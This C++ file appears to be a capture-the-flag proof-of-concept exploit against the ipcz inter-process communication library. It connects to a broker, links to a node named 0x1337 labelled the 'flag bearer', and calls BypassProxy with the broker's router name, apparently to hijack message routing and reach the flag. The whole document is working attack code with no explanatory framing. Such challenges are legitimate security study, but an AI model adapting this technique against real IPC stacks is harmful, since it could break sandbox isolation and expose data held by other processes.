#include <err.h>
#include <string.h>
#include <unistd.h>

#include <iostream>
#include <iterator>
#include <fstream>

#include "api.h"
#include "ipcz/node.h"
#include "ipcz/node_link.h"
#include "ipcz/router.h"
#include "util/ref_counted.h"
#include "standalone/base/logging.h"
#include "reference_drivers/multiprocess_reference_driver.h"

struct IpczAPI ipcz_api = {
    .size = sizeof(ipcz_api),
};

void CheckIPCZ(IpczResult result, const char *fn)
{
  if (result != IPCZ_RESULT_OK)
  {
    errx(1, "%s failed with error %d", fn, result);
  }
}

int check(int res, const char *msg)
{
  if (res == -1)
    err(1, "%s", msg);
  return res;
}

IpczHandle node;

void Get(IpczHandle portal, char *buf, uint32_t *buf_len)
{
  while (true)
  {
    IpczResult result = ipcz_api.Get(portal, IPCZ_NO_FLAGS, nullptr, buf,
                                     buf_len, nullptr, nullptr);
    if (result == IPCZ_RESULT_UNAVAILABLE)
    {
      usleep(1000);
      continue;
    }
    CheckIPCZ(result, "Get");
    return;
  }
}

void Put(IpczHandle portal, const char *buf, uint32_t buf_len)
{
  CheckIPCZ(
      ipcz_api.Put(portal, buf, buf_len, nullptr, 0, IPCZ_NO_FLAGS, nullptr),
      "Put");
}

int main(int argc, char *argv[])
{
  ipcz::standalone::SetVerbosityLevel(10);

  std::cout << "Started running PoC" << std::endl;

  CheckIPCZ(IpczGetAPI(&ipcz_api), "IpczGetAPI");
  CheckIPCZ(ipcz_api.CreateNode(
                &ipcz::reference_drivers::kMultiprocessReferenceDriver,
                IPCZ_INVALID_DRIVER_HANDLE, IPCZ_NO_FLAGS, NULL, &node),
            "CreateNode");

  IpczHandle portal;
  ipcz::reference_drivers::Channel channel(
      ipcz::reference_drivers::OSHandle(137));
  CheckIPCZ(
      ipcz_api.ConnectNode(
          node,
          ipcz::reference_drivers::CreateTransportFromChannel(
              std::move(channel), ipcz::reference_drivers::OSProcess(),
              ipcz::reference_drivers::MultiprocessTransportSource::
                  kFromNonBroker,
              ipcz::reference_drivers::MultiprocessTransportTarget::kToBroker),
          1, IPCZ_CONNECT_NODE_TO_BROKER, nullptr, &portal),
      "ConnectNode");

  std::cout << "Successfully created a portal to the broker" << std::endl;

  ipcz::Node *node_ptr = ipcz::Node::FromHandle(node);
  while (!node_ptr->GetBrokerLink())
  {
    std::cout << "... wait ..." << std::endl;
    usleep(1000);
  }

  Put(portal, "Work", 4);

  ipcz::Ref<ipcz::NodeLink> broker_link = node_ptr->GetBrokerLink();
  ipcz::NodeName router_name = broker_link->remote_node_name();
  std::cout << "Router name: " << router_name.ToString().c_str() << std::endl;

  bool flag_connected;

  ipcz::NodeName flag_name(0x1337, 0x1337);
  node_ptr->EstablishLink(
      flag_name,
      [&flag_connected](ipcz::NodeLink *new_link)
      {
        if (!new_link)
        {
          std::cout << "Failed to establish link with the flag bearer" << std::endl;
          exit(1);
        }

        std::cout << "Flag bearer connection established!!" << std::endl;

        flag_connected = true;
      });

  while (!flag_connected)
  {
    std::cout << "... wait ..." << std::endl;
    usleep(1000);
  }

  auto router = ipcz::MakeRefCounted<ipcz::Router>();

  ipcz::Ref<ipcz::NodeLink> flag_link = node_ptr->GetLink(flag_name);
  bool bypass_result = flag_link->BypassProxy(router_name, 0, ipcz::SequenceNumber(0), router);
  std::cout << "BypassProxy result: " << bypass_result << std::endl;

  int counter = 0;
  while (true)
  {
    std::this_thread::sleep_for(std::chrono::seconds(1));
    std::cout << "Tick " << counter++ << std::endl;
  }
}
